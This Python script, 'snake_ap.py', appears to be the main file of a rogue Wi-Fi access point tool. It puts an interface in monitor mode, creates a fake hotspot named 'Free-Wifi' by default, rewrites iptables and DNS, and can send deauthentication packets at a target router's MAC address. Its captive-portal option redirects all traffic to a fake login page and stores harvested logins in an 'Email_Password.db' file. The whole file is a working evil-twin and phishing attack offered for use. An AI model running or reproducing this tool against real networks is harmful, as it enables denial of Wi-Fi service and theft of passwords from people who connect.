#!/usr/bin/env python3

import re
import os 
import sys
import time
import subprocess
from subprocess import PIPE
import argparse
from Snake_Package.Deauth_wifi import Deauth_Router
from Snake_Package.banner import *

print(Banner2)
if os.geteuid() != 0 :
    print("\n[+] Run as root or sudo ")
    exit()
else:
    pass
os.system("sudo fuser -k 53/udp >/dev/null 2>&1 ")

Curent_dir  = os.path.abspath(os.getcwd())
user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]

def Check_Packages(): 
     list_Pakages = [
                     "  which dnsmasq      > /dev/unll 2>&1 ",
                     "  which apache2      > /dev/unll 2>&1",
                     "  which hostapd      > /dev/unll 2>&1",
                     "  which aircrack-ng  > /dev/unll 2>&1 "

                    ]       
     for package in list_Pakages :
              test_packages = subprocess.call(  package ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)  
              if test_packages == 0  :                     
                 continue
              else:  
                  for package in list_Pakages :
                      test_packages = subprocess.call(  package ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)  
                      if test_packages != 0  : 
                         if   'hostapd ' in package :
                            package ='hostapd'
                         elif 'apache2' in package :
                             package =  'apache2' 
                         elif "dnsmasq" in package :
                             package = 'dnsmasq'   
                         elif 'aircrack-ng' in package :
                             package = 'aircrack-ng'              
                         print ("[!] Error Package Not Found " ,package)
                  os.system("sudo killall dnsmasq >/dev/null 2>&1")       
                  exit()   
Check_Packages()

class Fake_access_point:
     
      def __init__(self):
          self.args_Control()  
          if self.args.List and len(sys.argv)==2:
             all_Interface = os.listdir('/sys/class/net/') 
             print("[+] List of Devices avelable "+'\n'+('='*20)+'\n')
             for interface in all_Interface :
                 print("[+] Interface : ",interface)
             exit()
          elif self.args.List and len(sys.argv)!=2 :
              print("[*] error : argumet -L/--List ")
              print("[+] use the option with out argumet < sudo ./snake_ap.py -L > ")
              exit()
          self.Show_ap_all() 
          if 'None' in str(self.args.Interface):
             print("usage: snake_ap.py [-h] [-I  ] [-S ] [-AP ] [-D  ] [-CP] [-L]")
             print("snake_ap.py: error: argument -I  /--Interface: required ")
             exit()
                               
          if self.args.Interface :
              all_Interface = os.listdir('/sys/class/net/') 
              if (self.args.Interface in all_Interface) or (str(self.args.Interface)+'mon' in all_Interface) :
                 print("[+] ChecK Paskages ....Done !! ")              
              else:
                 print("[+] fetching interface information : Device not found under Name ", self.args.Interface)
                 exit()  
          if self.args.Deauth :
             Mac_Format = re.compile(r'(?:[0-9a-fA-F]:?){12}')
             Mac_found = re.findall(Mac_Format , self.args.Deauth  )
             if self.args.Deauth  in Mac_found:
                pass
             else:
                 print("\n"+"[+] Invalid Mac address")
                 print("[+] Invalid literal for int() with base 16")
                 print("[+] Mac format = xx:xx:xx:xx:xx:xx")
                 exit() 
             os.system(" sudo iw dev wlan0 interface add wlansnake type station")  #sudo iw dev Sanke1 del 
             print("\n[+] Snake_AP add 'wlansnake'  as Virtual Interfaces ......!! ")
          else:
                pass       
          self.Clean_IP_Table()
          self.Create_Fake()
          self.Create_File_hostapd()     
          self.Create_dns_masq()        
          self.Start_InterFace()
          self.call_tremmial()
          
      def Show_ap_all(self):
          try:
             if self.args.Show and (len(sys.argv)==2):
                from Snake_Package.Show_AP import  Show_AP_all
                run = Show_AP_all()
                exit() 
             elif self.args.Show and (len(sys.argv)!=2):
                  print("[*] error : argumet -S/--Show ")
                  print("[+] use the option with out argumet < sudo ./snake_ap.py -S > ")
                  exit()
          except KeyboardInterrupt :
                 exit() 
      def Clean_IP_Table(self):
          Table_Flush = [
                            "sudo service NetworkManager start ",
                            "sudo iptables -D FORWARD --in-interface "+f'{self.args.Interface}'+"mon"+" -j ACCEPT"
                       ]
          for _ in Table_Flush :
              call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
              time.sleep(0.30)      
      def Create_Fake (self):
          try: 
              ifconfig_command  = [   
                                      
                               "sudo airmon-ng start "
                              ]
              for _ in  ifconfig_command :
                  call_termminal = subprocess.call( _ +f'{self.args.Interface}',shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
                  time.sleep(2)
              print("[+] Interface is in monitor Mode")
          except KeyboardInterrupt: 
              exit()
      def Create_File_hostapd(self):
          try:
              if os.path.exists(Curent_dir+"/Snake_config/") :
                 pass
              else:                 
                   os.mkdir(Curent_dir+"/Snake_config/") 
                   group  = "chown "+ user_name+ ":"+user_name +" *" 
                   os.system(group)             
                   print("[+] Sanke_AP Configrution hostapd and dnsmasq  is create " )                   
                   with open ('/etc/hostapd/hostapd.conf','w') as pathconfig :
                       pathconfig.write("DAEMON_CONF="+Curent_dir+"/Snake_config/hostapd.conf")               
              os.chdir(os.path.dirname(__file__)+"/Snake_config/")              
              with open("./hostapd.conf",'w') as config_hostapd :
                    if self.args.APName :
                       ssid_AP = self.args.APName
                    else:
                        ssid_AP = 'Free-Wifi'
                    config_hostapd.write(
                                          'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                          "driver=nl80211"+'\n'\
                                          "ssid="+ssid_AP+'\n'\
                                          "hw_mode=g"+'\n'\
                                          "channel=11"+'\n'\
                                          "macaddr_acl=0"+'\n'\
                                          "ignore_broadcast_ssid=0"+"\n"\
                                         )  
              group  = "chown "+ user_name+ ":"+user_name +" ./hostapd.conf" 
              os.system(group)   
          except KeyboardInterrupt:
                 exit()        
      def Create_dns_masq(self):
          try:
              with open("./dnsmasq.conf",'w') as dnsmasq:
                    
                   dnsmasq.write(
                                   'no-resolv'+'\n'\
                                   'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                   "dhcp-range=192.168.1.2, 192.168.1.30,255.255.255.0, 12h"+'\n'\
                                   "dhcp-option=3, 192.168.1.1"+'\n'\
                                   "dhcp-option=6, 192.168.1.1"+'\n'\
                                   "server= 208.67.220.220"+'\n'\
                                   "log-queries"+'\n'\
                                   "log-dhcp"+"\n"\
                                   "listen-address= 127.0.0.1"+'\n'                                
                                )  
              if self.args.Portal:
                      with open("./dnsmasq.conf",'a') as dnsmasq :
                                      dnsmasq.write("address=/#/192.168.1.1"+"\n")   
              group  = "chown "+ user_name+ ":"+user_name +" "+"dnsmasq.conf" 
              os.system(group) 
          except KeyboardInterrupt:
                exit() 
      def Start_InterFace(self):
          try:
             all_Interface = os.listdir('/sys/class/net/') 
             for interface in all_Interface :
                 try:  
                    command = 'ping -I '+f'{interface}'+' -w1 www.google.com  >/dev/null 2>&1 '   
                    communicate = os.system(command) 
                    if communicate  == 0 :
                       break          
                 except Exception  :
                    continue                      
             Set_Up_access_point = [

                                  "ifconfig "+f'{self.args.Interface}'+'mon'+" up 192.168.1.1 netmask 255.255.255.0",
                                  "route add -net 192.168.1.0 netmask 255.255.255.0 gw\
                                   192.168.1.1",
                                  "iptables --flush",
                                  "iptables --table nat --append POSTROUTING\
                                   --out-interface "+interface+" -j MASQUERADE",
                                  "iptables --append FORWARD --in-interface "+f'{self.args.Interface}'+"mon\
                                   -j ACCEPT",
                                  "iptables -t nat -A POSTROUTING -j MASQUERADE",
                                  "echo 1 > /proc/sys/net/ipv4/ip_forward",
                                ]
                                         
             for _ in Set_Up_access_point :
                call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)
          except KeyboardInterrupt:
                exit()
      def call_tremmial(self):
          try:   
             subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
             order = Curent_dir+"/Snake_Package/Host_apd.py"             
             command_proc = ' gnome-terminal  -e ' +'"' + order  +'"'                  
             call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)              
     
             order2 = "dnsmasq -C dnsmasq.conf -d"
             command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
             call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
             
             if self.args.Deauth :                                
                 run = Deauth_Router()  
             else:
                  pass 
             if self.args.Portal:
                from Snake_Package.Captive_Portal import Captive_Portal
                run = Captive_Portal()               
                subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"],shell=True)
                subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/read_errorLOG.py"],shell=True)
                command_run = Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"
                command_proc3 = ' gnome-terminal  -e ' +'"' + command_run +'"'               
                call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
                if os.path.exists(Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt") :
                   group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt" 
                   os.system(group)
                with open(Curent_dir+'/Email_Password.db','a') as DB_PASS :
                   group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Email_Password.db" 
                   os.system(group1)
          except KeyboardInterrupt :
                 exit()
      def args_Control(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
            parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = False ,help="Interface act AP 'Support AP Mode'" )                           
            parser.add_argument( '-S  ',"--Show", action='store_true' ,help="Show all access point around you [bssid-ssid-channel-sagenal]" )
            parser.add_argument( '-AP ',"--APName" ,metavar='' , action=None ,help = "Name of access point [ if not set the name option Defualit name is 'Free-wifi']")
            parser.add_argument( '-D  ',"--Deauth" ,metavar='' , action=None ,help = "send Deauth packet to the victom wifi [ airepay-ng ] ")
            parser.add_argument( '-CP ',"--Portal", action='store_true'  ,help = "set service wifi login page  [Captive_Portal]")
            parser.add_argument( '-L ',"--List", action='store_true'  ,help = "set service wifi login page  [Captive_Portal]")
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                   
                          
           
   
if __name__=='__main__':
     Fake_access_point()
